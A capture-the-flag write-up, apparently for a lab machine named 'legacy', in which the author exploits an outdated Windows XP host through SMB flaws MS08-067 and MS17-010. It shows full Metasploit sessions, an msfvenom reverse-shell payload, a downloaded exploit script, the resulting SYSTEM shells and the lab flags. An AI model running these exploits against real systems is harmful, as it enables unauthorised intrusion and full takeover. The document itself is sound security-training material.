# legacy



Machine IP: 10.10.10.4

```bash
TARGET_IP=10.10.10.4
```

## Reconnaissance

### Ports and services

Start by scanning open ports :

```bash
IP=10.10.10.4
Operation=ports
nmap -sT -Pn ${TARGET_IP} -p - --open -oN ${TARGET_IP}-nmap-${Operation}.txt -oX ${TARGET_IP}-nmap-${Operation}.xml
```

[Output](./10.10.10.4-nmap-ports.txt)

| port      | service       |
| ---       | ---           |
| 139/tcp   | netbios-ssn   |
| 445/tcp   | microsoft-ds  |

Now enumerate these services, and possible vulnerabilities :

```bash
Operation=services
Ports=139,445
nmap -sT -sV -sC -A -Pn ${TARGET_IP} -p ${Ports} -oN ${TARGET_IP}-nmap-${Operation}.txt -oX ${TARGET_IP}-nmap-${Operation}.xml
```

[Output](./10.10.10.4-nmap-services.txt)

From SMB, the hostname is `legacy`, and this is an old Windows XP.

```bash
Operation=vulns
Ports=139,445
nmap -sT -sV -sC -Pn ${TARGET_IP} -p ${Ports} --script vuln -oN ${TARGET_IP}-nmap-${Operation}.txt -oX ${TARGET_IP}-nmap-${Operation}.xml
```

[Output](./10.10.10.4-nmap-vulns.txt)

| port      | service       | Software/version  | Comment           |
| ---       | ---           | ---               | ---               |
| 139/tcp   | netbios-ssn   |                   |                   |
| 445/tcp   | microsoft-ds  | SMB v1                  | ms17-010 (CVE-2017-0143), ms08-067 (CVE-2008-4250)                 |

### Service: SMB - port 445/tcp

Enumerate the available Shares :

```bash
smbmap -H ${TARGET_IP} | tee "${TARGET_IP}-smbmap.txt"
```

[Output](./10.10.10.4-smbmap.txt)

There is no accessible share.

So we can search for the vulnerability `ms08-067` discovered by `nmap`:

```bash
Search="ms08-067"
searchsploit --www --color ${Search} | tee "${TARGET_IP}-searchsploit-${Search}.txt"
```

[Output](10.10.10.4-searchsploit-ms08-067.txt)

| Vulnerability | EDB |
| --- | --- |
| Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit) | EDB-16362 |
| Microsoft Windows Server 2000/2003 - Code Execution (MS08-067) | EDB-7132 |

We can also we can search for `ms17-010` discovered by `nmap`:

```bash
Search="ms17-010"
searchsploit --www --color ${Search} | tee "${TARGET_IP}-searchsploit-${Search}.txt"
```

[Output](./10.10.10.4-searchsploit-ms17-010.txt)

| Vulnerability | EDB |
| --- | --- |
| Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)  | EDB-43970 |
| Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)   | EDB-41891 |

And there is also a known exploit for this vulnerability:

[send_and_execute](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)

### Information founds

| port      | service       | Software/version  | Possible exploit      |
| ---       | ---           | ---               | ---                   |
| 139/tcp   | netbios-ssn   |                   |                       |
| 445/tcp   | microsoft-ds  | SMB v1            | ms17-010 (CVE-2017-0143), ms08-067 (CVE-2008-4250) |

## Gaining access

### SMB - ms08-067 (CVE-2008-4250) - MetaSploit

We will use MetaSploit :

```bash
msfconsole -q
```

```text
[msf](Jobs:0 Agents:0) >> search ms08-067
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/met
                                       asploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process,
                                        none)
   LHOST     192.168.8.28     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

Configure :

```text
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set LHOST 10.10.14.18
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> set RHOSTS 10.10.10.4
```

Confirm the vulnerability :

```text
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> check
[+] 10.10.10.4:445 - The target is vulnerable.
```

Exploit :

```text
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit

[*] Started reverse TCP handler on 10.10.14.18:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.18:4444 -> 10.10.10.4:1031 ) at 2022-04-10 21:13:17 +0200
```

Check the current username :

```text
(Meterpreter 1)(C:\WINDOWS\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

This is the system account, the target is fully compromised.

Get the flags from this SYSTEM account :

```text
(Meterpreter 1)(C:\WINDOWS\system32) > cat "c:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
(Meterpreter 1)(C:\WINDOWS\system32) > cat "c:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
```

### SMB - ms08-067 (CVE-2008-4250) - Without MetaSploit

[EDB-7132](https://www.exploit-db.com/exploits/7132)

The exploit is a python2 script. it takes 2 parameters :

- target
- OS version

The OS version is Windows 2000, or Windows 2003, and does not match the target OS version (Windows XP).

By searching on Google `MS08-067 windows XP site:github.com`, there is an interesting script that can match :

[MS08_067 Python Exploit Script - Updated 2018](https://github.com/andyacer/ms08_067)

This exploit is a python2 script similar to the previous one. It takes 3 parameters :

- target
- OS version
- port

```python
target = sys.argv[1]
os = sys.argv[2]
port = sys.argv[3]
```

Download this script:

```bash
wget https://github.com/andyacer/ms08_067/raw/master/ms08_067_2018.py -O ms08_067_2018.py
```

It support Windows XP SP3 and require a payload in this script, in variable `shellcode`.

The command line is provided in order to generate the payload :

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=${TARGET_IP} LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -a x86 --platform windows -v shellcode
```

And replace the variable `shellcode` in the script by this one generated.

In order to execute this script, there is a dependency on `impacket`. Use a virtualenv in order to manage this dependency and execute the script :

```bash
virtualenv -p python2 venv
. venv/bin/activate
pip install impacket
chmod +x ./ms08_067_2018.py
```

Prepare the listener before executing :

```bash
nc -nvlp 62000
```

And execute:

```bash
IP=10.10.10.4
python ./ms08_067_2018.py ${TARGET_IP} 6 445
```

```text
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

The reverse shell is activated :

```bash
nc -nvlp 62000
listening on [any] 62000 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.4] 1030
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Clean :

```bash
rm -rf ./venv ./ms08_067_2018.py
```

### SMB - ms17-010 (CVE-2017-0143) - MetaSploit

We will use MetaSploit :

```bash
msfconsole -q
```

```text
[msf](Jobs:0 Agents:0) >> search ms17-010
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting        Required  Description
   ----                  ---------------        --------  -----------
   DBGTRACE              false                  yes       Show extra debug trace info
   LEAKATTEMPTS          99                     yes       How many times to try to leak tran
                                                          saction
   NAMEDPIPE                                    no        A named pipe that can be connected
                                                           to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit  yes       List of named pipes to check
                         -framework/data/wordl
                         ists/named_pipes.txt
   RHOSTS                                       yes       The target host(s), see https://gi
                                                          thub.com/rapid7/metasploit-framewo
                                                          rk/wiki/Using-Metasploit
   RPORT                 445                    yes       The Target port (TCP)
   SERVICE_DESCRIPTION                          no        Service description to to be used
                                                          on target for pretty listing
   SERVICE_DISPLAY_NAME                         no        The service display name
   SERVICE_NAME                                 no        The service name
   SHARE                 ADMIN$                 yes       The share to connect to, can be an
                                                           admin share (ADMIN$,C$,...) or a
                                                          normal read/write folder share
   SMBDomain             .                      no        The Windows domain to use for auth
                                                          entication
   SMBPass                                      no        The password for the specified use
                                                          rname
   SMBUser                                      no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process,
                                        none)
   LHOST     192.168.8.28     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Configure :

```text
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.18
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOSTS 10.10.10.4
```

Confirm the vulnerability :

```text
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> check

[*] 10.10.10.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.4:445 - The target is vulnerable.
```

Exploit :

```text
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit

[*] Started reverse TCP handler on 10.10.14.18:4444 
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -    [*] Preparing dynamite...
[*] 10.10.10.4:445 -        [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x822ad100
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... EigZSnPL.exe
[*] 10.10.10.4:445 - Created \EigZSnPL.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (175174 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \EigZSnPL.exe...
[*] Meterpreter session 1 opened (10.10.14.18:4444 -> 10.10.10.4:1032 ) at 2022-04-10 21:24:49 +0200

(Meterpreter 1)(C:\WINDOWS\system32) > getuid
Server username: NT AUTHORITY\SYSTEM
```

Got a shell under the SYSTEM account.

## maintaining access

No action required

## Cleaning

No action required

## Proofs

| Item      | Value                            |
| ---       | ---                              |
| User flag | e69af0e4f443de7e36876fda4ec7644f |
| Root flag | 993442d258b0e0ec917cae9e695d5713 |

## Remediation

The OS is outdated, and need to be replaced by an up-to-date OS.
